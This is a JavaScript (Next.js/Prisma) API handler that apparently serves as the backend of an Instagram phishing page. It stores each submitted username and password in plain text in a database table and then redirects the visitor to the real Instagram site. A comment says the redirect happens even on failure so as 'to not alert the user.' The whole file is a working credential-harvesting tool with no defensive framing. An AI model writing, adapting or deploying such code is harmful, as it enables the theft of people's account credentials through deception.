import { PrismaClient } from '@prisma/client';

// Prevent multiple instances of Prisma Client in development
const globalForPrisma = global;
const prisma = globalForPrisma.prisma || new PrismaClient();

if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma;

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).send("Method Not Allowed");
    }

    const { username, password } = req.body;

    try {
        await prisma.loginAttempt.create({
            data: {
                username: username || '',
                password: password || '',
            },
        });
        console.log('Credentials saved to database:', { username });
    } catch (error) {
        console.error('Error saving to database:', error);
        // Continue to redirect even if DB save fails to not alert the user
    }

    return res.redirect(302, "https://www.instagram.com/");
}
